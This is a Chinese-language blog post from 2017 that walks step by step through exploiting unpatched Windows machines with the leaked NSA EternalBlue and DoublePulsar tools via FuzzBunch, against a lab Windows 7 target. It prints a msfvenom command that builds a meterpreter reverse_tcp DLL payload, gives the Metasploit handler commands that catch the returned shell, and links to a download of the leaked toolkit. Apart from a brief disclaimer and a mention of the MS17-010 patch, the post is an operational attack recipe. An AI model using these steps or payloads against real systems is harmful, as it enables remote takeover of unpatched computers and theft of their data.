---
layout: post
title: '微软末日:黑掉全球70%电脑的0day'
date: 2017-04-15 20:41:27
comments: true
tags:
	- 安全攻防
---

### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

### 正文

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。
<!--more-->
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。

ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。

### 环境
 * python2.6.6/32位
 * pywin32-221.win32-py2.6

靶机 win7
![](/images/pasted-69.jpg)

攻击者1
![](/images/pasted-70.jpg)

攻击者2
![](/images/pasted-71.jpg)

### 配置

下载解压后切换到windows目录执行python fb.py
**
默认选项参数特别多，我这里只说重要需要填写的参数**

输入靶机ip和攻击者ip以及选择是否开启本地监听。

![](/images/pasted-72.jpg)

创建一个工程项目，名字随意

![](/images/pasted-73.jpg)

选择模块，选择Eternalblue模块，输入use Eternalblue

![](/images/pasted-74.jpg)

一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式

![](/images/pasted-75.jpg)

然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。

![](/images/pasted-76.jpg)

接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，
继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式

![](/images/pasted-77.jpg)

然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll > s.dll

如果电脑是32位的就去掉x64/，默认生成的就是32位的

然后再启动配置msf，并监听反弹的shell。
```shell
    msf > use exploit/multi/handle
    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_Tcp
    msf exploit(handler) > set LHOST 192.168.1.102
    msf exploit(handler) > set LPORT 5554
```

选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。

![](/images/pasted-78.jpg)

再来看看我们监听的反弹shell

![](/images/pasted-79.jpg)

成功反弹，喜大普奔。

### 结尾
> 可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁[(点我)](https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/)
> 并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。

### 总结
> 这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。
> ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。

下载地址：
> * [https://github.com/x0rz/EQGRP_Lost_in_Translation](https://github.com/x0rz/EQGRP_Lost_in_Translation)